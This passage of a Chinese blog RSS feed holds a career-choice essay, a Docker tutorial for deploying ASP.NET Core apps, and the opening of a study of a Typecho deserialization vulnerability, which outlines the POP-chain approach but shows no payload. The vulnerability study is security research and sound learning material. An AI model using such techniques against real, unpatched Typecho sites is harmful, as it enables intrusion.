&lt;p&gt;刚开始读研的时候，我还一心想着做游戏开发，想着实在不行的话，靠着之前的那些基础，做做Android或者Java也可以吧，于是我的简历上有着各个方向的经验，项目经验既有游戏开发、Android开发，也有Java Web的项目。现在想想是非常可笑的，因为我每个方向都不精，经验也都很水，求职意向不明确，这样的简历在大公司的面试官看来简直就是笑话。&lt;/p&gt;
&lt;p&gt;那时候我还不明白这个道理，只希望自己的求职方向大而全，能够多覆盖几个岗位，每个岗位都投一次简历，广撒网多捞鱼，殊不知投简历最忌讳的就是这个事情，公司找的是能胜任某个岗位的人才，而不是啥都不精的半吊子。还好，没过多久我就明白了这个道理，于是分别做了三个方向的简历，每份简历只写和岗位相关的经历。&lt;/p&gt;
&lt;p&gt;那时候发现一个问题，身边的同学罕有做移动端和游戏开发的，大多数是做Java或者C++后台开发的，除此之外还有一些人做的方向我之前听都没听过，什么机器学习、数据挖掘，这都是我在读研的时候才知道的岗位。后来才发现，这几年这个方向很火，薪资很高，做游戏、移动端的越来越少，也和行业状况有很大的关系。&lt;/p&gt;
&lt;p&gt;当时我还是比较纠结的，是继续做小众的游戏开发或者移动端，找小众的游戏公司，还是做需求量更大的Java方向，去尝试更多的大公司呢。想来想去，游戏大厂就那么两家，反观Java方向能去的互联网公司，BAT、TMD不说，还有很多二线的企业、银行，甚至是国企，这完全是两条路啊，一条是圈子很小，选择很少的游戏程序员路线，一条是机会多，公司多的，很多人也在走的Java程序员路线，考虑到未来的岗位机会、工作机会、职业发展，最终我还是选了后者。&lt;/p&gt;
&lt;h2&gt;再谈选择技术方向的关键因素&lt;/h2&gt;
&lt;p&gt;如今我已经在Java这条路上走了很久了，回顾过去，其实也不知道当初做的这个选择是不是对的，虽然现在也是在一线大厂，但是如果当初还是做游戏开发，现在又会在哪呢，说不准，谁也不知道。&lt;/p&gt;
&lt;p&gt;所以，选择了一个技术方向，可能也意味着你今后要在这条路上走很久，走很远，可能无法回头。就像是选专业一样，大学四年不能白学，专业课不是白上的，很多人虽然不喜欢自己的专业，但是再去尝试其他专业的成本实在太高，所以半推半就也只好接受了不太喜欢的工作。&lt;/p&gt;
&lt;p&gt;选择技术方向，比高考选专业要灵活多了，没有分数要求，也不用权衡学校和专业，只要考虑自己的兴趣、能力、未来发展路线，就可以确定好自己的一个方向。这里不再大谈各个技术方向，因为上次的那篇文章已经讲了够多了，有兴趣的可以回头去看看。&lt;/p&gt;
&lt;p&gt;如今还是有很多同学来问我，怎么选方向，大数据还是Java、Python还是Java、前端还是后端、计算机还是软件。其实你们问我，不如问问自己，到底喜欢什么方向，其实这些岗位都不错，未来也大有可为，大厂的需求也很大，短期看来算法和大数据还是很火，但是前端后端仍然是常青树，测试、运维等岗位需求不算大但是却是进大厂的一种不错方式，游戏开发和移动端虽然没有以前那么火，但是小众的人才更稀缺。&lt;/p&gt;
&lt;p&gt;不管怎么说，选好一个方向，是很重要的，未来你必须在这个方向深挖，积累，成为这个方向的技术专家，这是每一个程序员都需要面对的挑战。&lt;/p&gt;

</description>
<pubDate>Tue, 30 Apr 2019 14:04:00 +0000</pubDate>
<dc:creator>黄小斜</dc:creator>
<og:description>作者：黄小斜 文章来源：微信公众号【程序员江湖】 游戏在今天的普及度已经不是端游时代可以比肩的了。如今人手一台手机、平板就可以吃鸡、打农药，不仅是男生，也有很多女生加入了游戏圈。相信现在在看文章的你也</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/xll1025/p/10798262.html</dc:identifier>
</item>
<item>
<title>docker部署Asp.net core应用 - 捞月亮的猴子</title>
<link>http://www.cnblogs.com/wyy1234/p/10747196.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/wyy1234/p/10747196.html</guid>
<description>&lt;h2&gt;1 容器概念&lt;/h2&gt;
&lt;p&gt;　　使用Docker前我们首先要简单了解一下容器的概念。MSDN上有一张虚拟机和容器的对比图，很好的展示了虚拟机和容器的区别，如下所示，&lt;span class=&quot;x-hidden-focus&quot; data-ttu-id=&quot;beb4c-132&quot;&gt;虚拟机包括应用程序、必需的库或二进制文件以及完整的来宾操作系统，&lt;strong&gt;每台虚拟机都有一个单独的内核，我们完全可以把虚拟机看做是一台真实的物理机&lt;/strong&gt;。 &lt;span class=&quot;x-hidden-focus&quot; data-ttu-id=&quot;beb4c-133&quot;&gt;&lt;span data-ttu-id=&quot;beb4c-134&quot;&gt;容器包括应用程序及其所有依赖项，&lt;span data-ttu-id=&quot;beb4c-135&quot;&gt;&lt;strong&gt;与其他容器共享 OS 内核&lt;/strong&gt;，容器在主机操作系统上作为独立进程运行，&lt;strong&gt;我们可以把容器看做是一个应用沙盒&lt;/strong&gt;。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;x-hidden-focus&quot; data-ttu-id=&quot;beb4c-132&quot;&gt;&lt;span class=&quot;x-hidden-focus&quot; data-ttu-id=&quot;beb4c-133&quot;&gt;&lt;span data-ttu-id=&quot;beb4c-134&quot;&gt;&lt;span data-ttu-id=&quot;beb4c-135&quot;&gt;　　我们经常会遇到“我机器上可以运行”的问题吧，然后部署到其他机器时就遇到了各种坑，这多是因为其他设备上缺少应用所需的环境或者缺少应用的依赖项造成的。使用容器技术可以很好的解决这个问题，容器是一个“应用的沙盒”，这个沙盒内部包含了应用所需的环境和所有依赖项，只要有这个沙盒存在，应用在任何环境下都能正常的运行，容器技术的典型特点就是“一次封装，到处运行”。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1007918/201904/1007918-20190430190652083-1488305705.png&quot; alt=&quot;&quot;/&gt;        &lt;img src=&quot;https://img2018.cnblogs.com/blog/1007918/201904/1007918-20190430190757209-732731161.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　Docker 是一个使用go语言开发的开源的&lt;strong&gt;应用容器引擎&lt;/strong&gt;，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。我们先了解Docker中的三个核心概念：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1  镜像(Image)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　镜像是一种轻量级、可执行的独立软件包，它包含运行某个软件所需的所有内容，包括代码、运行时、库、环境变量和配置文件。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2  容器(Container)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　容器是镜像的运行时实例 ，执行镜像时内存中运行的就是容器。如果把容器看做面向对象中的类，容器就是对象。使用类时通过new来获取一个对象，类似的使用镜像时通过  &lt;span class=&quot;cnblogs_code&quot;&gt;docker run &amp;lt;镜像名/镜像id&amp;gt;&lt;/span&gt; 创建一个容器。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3 仓库(Repository)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　仓库时用来存放镜像的地方，Docker hub是docker官方提供的仓库，类似于githhub,，通过push推送镜像到仓库，通过pull命令拉取镜像。当然我们也可以使用其他仓库，或者自己搭建一个仓库。&lt;/p&gt;
&lt;h2&gt;2 安装docker&lt;/h2&gt;
&lt;h3&gt;1 Windows安装docker&lt;/h3&gt;
&lt;p&gt;　　docker是运行在Linux系统上的，在Windows上使用docker默认要用到Hyper-V功能，所以我们在Windows系统上安装Docker必须先开启Hyper-V功能。首先打开【控制面板】，找到【启动或关闭Windows功能】，然后勾选【Hyper-V】，点击确定即可安装Hyper-V。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1007918/201904/1007918-20190421214947782-1325836123.png&quot; alt=&quot;&quot;/&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; 　　安装好Hyper-V后，到docker官网下载Windows版本的docker，docker需要登录账户才能下载，我们可以创建一个账户，牢记这个账号，我们以后会经常用到。docke下载地址：&lt;a href=&quot;https://hub.docker.com/editions/community/docker-ce-desktop-windows&quot; target=&quot;_blank&quot;&gt;docker下载&lt;/a&gt;。下载完成后，双击安装包，一路next即可。安装完成后需要重启电脑，打开命令行，输入 &lt;span class=&quot;cnblogs_code&quot;&gt;docker run hello-world&lt;/span&gt; ，如果出现以下界面，表示docker已经安装成功了。docker run hello-world命令首先会在本地找名字为hello-world的镜像，如果本地不存在这个镜像就会从docker hub上拉取hello-world镜像，然后运行。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1007918/201904/1007918-20190421230603239-1388408868.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h3&gt; 2 Centos安装docker&lt;/h3&gt;
&lt;p&gt; 　　Linux系统安装常用软件都十分方便，执行下边的命令即可安装docker&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt;删除旧版本&lt;/span&gt;
&lt;span&gt;sudo yum remove docker \
                  docker&lt;/span&gt;-&lt;span&gt;client \
                  docker&lt;/span&gt;-client-&lt;span&gt;latest \
                  docker&lt;/span&gt;-&lt;span&gt;common \
                  docker&lt;/span&gt;-&lt;span&gt;latest \
                  docker&lt;/span&gt;-latest-&lt;span&gt;logrotate \
                  docker&lt;/span&gt;-&lt;span&gt;logrotate \
                  docker&lt;/span&gt;-&lt;span&gt;engine
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;安装一些需要的工具&lt;/span&gt;
yum install -y yum-utils device-mapper-persistent-&lt;span&gt;data lvm2
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;添加软件源信息&lt;/span&gt;
sudo yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-&lt;span&gt;ce.repo
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;更新yum缓存&lt;/span&gt;
&lt;span&gt;yum makecache fast
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;安装docker&lt;/span&gt;
yum -y install docker-&lt;span&gt;ce
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;启动docker服务&lt;/span&gt;
&lt;span&gt;systemctl start docker
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;测试docker&lt;/span&gt;
docker run hello-world
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　安装完成后执行 &lt;span class=&quot;cnblogs_code&quot;&gt;docker run hello-world&lt;/span&gt;命令，如果出现下边的界面表示docker安装成功了&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1007918/201904/1007918-20190422205551811-105025092.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;3 Docker基本使用&lt;/h2&gt;
&lt;h3&gt;1 使用官方docker实例&lt;/h3&gt;
&lt;p&gt;　　可以查看&lt;a href=&quot;https://docs.docker.com/get-started/&quot; target=&quot;_blank&quot;&gt;官方教程&lt;/a&gt;详细地了解docker的使用，这里我们先用两分钟分钟展示一下微软官方提供的docker栗子，执行命令 &lt;span class=&quot;cnblogs_code&quot;&gt;docker run  -p 8000:80 --name aspnetcore_sample mcr.microsoft.com/dotnet/core/samples:aspnetapp&lt;/span&gt; ，-p 8000:80表示将服务器的8000端口和容器的80端口建立映射，访问服务器8000端口时会去访问容器的80端口。--name设置镜像的名字&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1007918/201904/1007918-20190430202151902-365908913.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　打开浏览器，访问虚拟机的8000端口如下，说明我们的容器已经成功启动了！&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1007918/201904/1007918-20190430202556846-318310688.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　我们使用 &lt;span class=&quot;cnblogs_code&quot;&gt;docker images&lt;/span&gt; 和 &lt;span class=&quot;cnblogs_code&quot;&gt;docker container ls&lt;/span&gt; 查看一下本机的容器和镜像，结果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1007918/201904/1007918-20190430203143636-2141006732.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h3&gt;2 Docker常用命令&lt;/h3&gt;
&lt;p&gt;　　其实我们实际开发中能用到的docker命令并不多，这里简单汇总一下最常用的docker命令。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;strong&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;# 查看docker版本和信息&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt;查看docker-cli的版本&lt;/span&gt;
docker --&lt;span&gt;version
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;查看docker版本和信息&lt;/span&gt;
&lt;span&gt;docker version
docker info

&lt;/span&gt;&lt;strong&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;# docker镜像相关命令&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt;拉取镜像&lt;/span&gt;
&lt;span&gt;docker pull [imgName:tag]
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;运行镜像,执行后会生成一个容器&lt;/span&gt;
docker run [imgName:tag/&lt;span&gt;imgID]
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;查看所有的镜像&lt;/span&gt;
&lt;span&gt;docker images
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;删除镜像 执行rmi命令前必须删除所有该镜像的container&lt;/span&gt;
docker rmi [&lt;span&gt;imgName:tag/imgID] &lt;/span&gt;&lt;strong&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;#docker容器相关命令&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt;查看所有的容器，没有-a表示查询所有正在运行中的容器&lt;/span&gt;
docker container ls -&lt;span&gt;a 
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;查看docker正在运行和已经停止的容器&lt;/span&gt;
docker ps -&lt;span&gt;a 
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;启动容器&lt;/span&gt;
docker start [ctnName/&lt;span&gt;cID]
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;停止容器&lt;/span&gt;
docker stop [ctnName/&lt;span&gt;cID]
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;删除容器，执行rm命令前必须先停止该容器&lt;/span&gt;
docke rm [ctnName/&lt;span&gt;cID] 

&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;#清理镜像和容器&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt;删除所有的镜像和容器&lt;/span&gt;
docker kill $(docker ps -q) ; docker rm $(docker ps -a -q) ; docker rmi $(docker images -q -&lt;span&gt;a)
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;删除所有的容器&lt;/span&gt;
docker kill $(docker ps -q) ; docker rm $(docker ps -a -&lt;span&gt;q)
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;清除名称为none的镜像&lt;/span&gt;
docker ps -a | grep &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Exited&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; | awk '{print &lt;span&gt;$1&lt;/span&gt; }'|&lt;span&gt;xargs docker stop
docker ps &lt;/span&gt;-a | grep &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Exited&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; | awk '{print &lt;span&gt;$1&lt;/span&gt; }'|&lt;span&gt;xargs docker rm
docker images&lt;/span&gt;|grep none|awk '{print &lt;span&gt;$3&lt;/span&gt; }'|xargs docker rmi
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 　　有时候我们需要和容器交互，可以使用命令 &lt;span class=&quot;cnblogs_code&quot;&gt;docker exec -it [name/id] common&lt;/span&gt; 。如我们启动一个mysql容器mysqlx1，执行 &lt;span class=&quot;cnblogs_code&quot;&gt;docker exec -it mysqlx1 mysql -p&lt;/span&gt; 表示和容器mysqlx1交互，执行的命令是【mysql -p】进行登录，如下所示。 &lt;span class=&quot;cnblogs_code&quot;&gt;Ctrl +p+q&lt;/span&gt; 退出容器，回到服务器目录。&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/1007918/201904/1007918-20190422221158707-57987242.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;3 定制容器&lt;/h2&gt;
&lt;p&gt;　　大多数用户使用docker的核心目的是更方便的交付项目，就是将我们的应用程序构建成镜像，然后交付镜像即可，这里演示怎么构建一个Aspnet core项目的镜像。&lt;/p&gt;
&lt;h3&gt;1. 开发aspnet core应用&lt;/h3&gt;
&lt;p&gt;　　我们创建一个Asp net core MVC项目，项目名为DockerDemo，为了方便不勾选Https和Dcoker执行，如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1007918/201904/1007918-20190430180134406-177733317.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　简单修改首页，运行一下，测试项目没有bug，运行首页如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1007918/201904/1007918-20190430180419655-966635454.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h3&gt;2 发布项目，添加Dockerfile&lt;/h3&gt;
&lt;p&gt;　　发布项目，然后在发布文件夹下添加Dockerfile文件，结构如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1007918/201904/1007918-20190430180731825-1338597215.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　Dockerfile的内容如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt;拉取runtime父镜像，运行aspnet core应用必须要用runtime&lt;/span&gt;
FROM microsoft/dotnet:2.2-aspnetcore-&lt;span&gt;runtime
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;设置容器工作目录&lt;/span&gt;
WORKDIR /&lt;span&gt;DockerDemo
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;把当前目录的所有文件copy到工作目录中&lt;/span&gt;
COPY . /&lt;span&gt;DockerDemo
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;暴露一个端口让外部可以访问&lt;/span&gt;
EXPOSE 80
&lt;span&gt;#&lt;/span&gt;&lt;span&gt;容器入口命令，即容器启动时执行dotnet DockerDemo.dll命令&lt;/span&gt;
ENTRYPOINT [&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;dotnet&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;DockerDemo.dll&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;]
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 　　Dockerfile常见指令简单说明&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;Dockerfile常用指令：

&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;FROM:通常情况下，我们创建的镜像时基于另外一个镜像的，这时就要用FROM，当然我们也可以完全从头创建&lt;/span&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt;WORKDIR:设置容器的工作目录&lt;/span&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt;MAINTAINER:该镜像的维护人&lt;/span&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt;COPY:经常需要把源码复制到容器中，只用COPY就可以实现这一点&lt;/span&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt;RUN:这里可以定义一些需要运行的命令，执行的目录是WORKDIR。如npm install ,dotnet restore，dotnet run等&lt;/span&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt;ENTRYPOINT:定义容器的入口，通常是一些dotnet/node等命令,如dotnet xxx.dll&lt;/span&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt;CMD:设置容器运行的默认命令和参数,即容器启动时执行的命令。当容器运行时，可以通过命令行覆盖CMD定义的命令&lt;/span&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt;EXPOSE:暴露端口&lt;/span&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt;ENV:设置环境变量&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;3 创建镜像&lt;/h3&gt;
&lt;p&gt;　　docker创建镜像很简单，执行 &lt;span class=&quot;cnblogs_code&quot;&gt;docker build -t dockerdemo:v1.&lt;span&gt;0&lt;/span&gt; .&lt;/span&gt; 命令即可创建镜像，其中dockerdemo:v1.0是镜像的名字和版本tag，名字和tag可以随便设置。然后通过 &lt;span class=&quot;cnblogs_code&quot;&gt;docker images&lt;/span&gt; 命令查看所有镜像，如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1007918/201904/1007918-20190430153352586-771434037.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h3&gt;4 运行容器&lt;/h3&gt;
&lt;p&gt; 　使用命令 &lt;span class=&quot;cnblogs_code&quot;&gt;docker run -d -p &lt;span&gt;8080&lt;/span&gt;:&lt;span&gt;80&lt;/span&gt; dockerdemo:v1.&lt;span&gt;0&lt;/span&gt;&lt;/span&gt; 启动容器，-d 表示后台运行，-p 8080：80表示服务器的8080端口映射到容器的80端口，我们也可以使用服务器的其他端口，容器的端口为Dockerfile中Expose的端口。执行 &lt;span class=&quot;cnblogs_code&quot;&gt;docker container ls&lt;/span&gt; 查看容器，这里我们的容器已经启动了，如下：&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/1007918/201904/1007918-20190430154210543-235795064.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　打开浏览器，输入【服务器IP:服务器端口】接口访问容器，如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1007918/201904/1007918-20190430155323666-1649292809.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 　　到这一步，本地创建镜像和运行容器成功了。&lt;/p&gt;
&lt;h3&gt;5 使用docker hub存储和分发镜像&lt;/h3&gt;
&lt;p&gt;　　docker提供了远程仓库用于存储和分发镜像，其作用类似于github,区别在于github托管代码，而docker hub托管镜像。我们创建好了镜像可以推送(push)到远程仓库，然后在其他设备上拉取(pull)镜像，有了docker hub我们可以更方便的管理和分发镜像。docker hub的使用非常简单，只记住三个命令就可以了&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt;标记镜像，就是设置远程镜像名和标记&lt;/span&gt;
docker tag  localname:localtag dockeruser/&lt;span&gt;repname:reptag
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;推送镜像文件到docker hub&lt;/span&gt;
docker push username/&lt;span&gt;repname:reptag
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;拉取远程镜像&lt;/span&gt;
&lt;span&gt;docker pull repname:reptag

&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;注：localname是本地镜像名   localtag是本地镜像tag&lt;/span&gt;&lt;span&gt;
#   &lt;/span&gt;&lt;span&gt;repname远程仓库的镜像名  reptag是远程仓库的tag&lt;/span&gt;&lt;span&gt;
#   &lt;/span&gt;&lt;span&gt;username是我们的dockerhub用户名&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　这里将上边创建的本地镜像推动到docker hub。 使用命令 &lt;span class=&quot;cnblogs_code&quot;&gt;docker tag dockerdemo:v1.&lt;span&gt;0&lt;/span&gt; wyyxxx/resdockerdemo:v1.&lt;span&gt;0&lt;/span&gt;&lt;/span&gt; 标记，使用命令 &lt;span class=&quot;cnblogs_code&quot;&gt;docker push wyyxxx/resdockerdemo:v1.&lt;span&gt;0&lt;/span&gt;&lt;/span&gt; 推动镜像到远程仓库，打开 &lt;a href=&quot;https://hub.docker.com&quot; target=&quot;_blank&quot;&gt;镜像仓库&lt;/a&gt;，登陆后就可以看到我们自定义的镜像了，如下所示。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1007918/201904/1007918-20190430161532262-80696420.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 　　然后使用另一台安装了docker的服务器，执行命令 &lt;span class=&quot;cnblogs_code&quot;&gt;docker run -p &lt;span&gt;8080&lt;/span&gt;:&lt;span&gt;80&lt;/span&gt; wyyxxx/resdockerdemo:v1.&lt;span&gt;0&lt;/span&gt;&lt;/span&gt; 拉取远程镜像并启动 ，打开浏览器输入地址，如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1007918/201904/1007918-20190430170404416-1745371636.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 　　我们在通过拉取远程镜像并运行容器时，不需要事先部署环境(如安装runtime)等，因为镜像中已经设置了需要的所有环境和依赖资源，只需要使用 &lt;span class=&quot;cnblogs_code&quot;&gt;docker run&lt;/span&gt; 命令运行即可。这也是使用容器交付的方便之处。&lt;/p&gt;
&lt;h2&gt; 4 使用Docker的一点建议&lt;/h2&gt;
&lt;p&gt;① “3C原则”一个容器只运行一个应用&lt;/p&gt;
&lt;p&gt;② 使用镜像交付应用程序，而不是直接部署&lt;/p&gt;
&lt;p&gt;　　如果要在centos上部署一个aspnet core应用程序。错误的做法是：在docker中先安装一个centos系统，在centos系统中部署环境，然后部署我们的netcore应用程序,,最后把部署的应用程序生成镜像。正确的做法是通过Dockerfile定义我们需要的环境和依赖项，然后生成镜像，通过镜像去分发和执行。&lt;/p&gt;
&lt;p&gt;③ 分层构建镜像&lt;/p&gt;
&lt;p&gt;　　还是上边centos部署netcore应用的栗子，如果从零定制镜像时，我们应该把centos作为一层镜像，环境runtime作为一层镜像，最后我们的应用做为一层镜像，使用Dockerfile的FROM 指令拉取父镜像。这样做的好处是节省空间和复用镜像。如上边我们使用了2.2版本的runtime镜像，当我们创建了另一个web应用再来定制镜像时，这两个应用程序镜像可以 共用同一个runtime镜像。&lt;/p&gt;
&lt;p&gt;④ 不要把数据存储在容器中&lt;/p&gt;
&lt;p&gt;　　容器是随时可能销毁的，销毁后容器内部的数据就不存在了，所以最好不要在容器中存储需要持久化的数据。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt; &lt;/span&gt;&lt;/code&gt;&lt;/p&gt;

</description>
<pubDate>Tue, 30 Apr 2019 12:58:00 +0000</pubDate>
<dc:creator>捞月亮的猴子</dc:creator>
<og:description>1 容器概念 使用Docker前我们首先要简单了解一下容器的概念。MSDN上有一张虚拟机和容器的对比图，很好的展示了虚拟机和容器的区别，如下所示，虚拟机包括应用程序、必需的库或二进制文件以及完整的来宾</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/wyy1234/p/10747196.html</dc:identifier>
</item>
<item>
<title>Typecho-反序列化漏洞学习 - ka1n4t</title>
<link>http://www.cnblogs.com/litlife/p/10798061.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/litlife/p/10798061.html</guid>
<description>&lt;h2 id=&quot;typecho-反序列化漏洞学习&quot;&gt;Typecho-反序列化漏洞学习&lt;/h2&gt;
&lt;h3 id=&quot;x00-前言&quot;&gt;0x00 前言&lt;/h3&gt;
&lt;p&gt;补丁：&lt;br/&gt;&lt;a href=&quot;https://github.com/typecho/typecho/commit/e277141c974cd740702c5ce73f7e9f382c18d84e#diff-3b7de2cf163f18aa521c050bb543084f&quot; class=&quot;uri&quot;&gt;https://github.com/typecho/typecho/commit/e277141c974cd740702c5ce73f7e9f382c18d84e#diff-3b7de2cf163f18aa521c050bb543084f&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这里我下了1.0版本：&lt;br/&gt;&lt;code&gt;git clone https://github.com/typecho/typecho.git --branch v1.0-14.10.10-release&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&quot;x01-分析过程&quot;&gt;0x01 分析过程&lt;/h3&gt;
&lt;p&gt;这个漏洞非常有趣。首先是一个可控参数的反序列化表达式。然后构造pop链，寻找__destruct方法，然而没有找到可利用的。但是通过对反序列化后的变量跟踪发现，有对其当作字符串调用，因此寻找__toString方法。&lt;/p&gt;
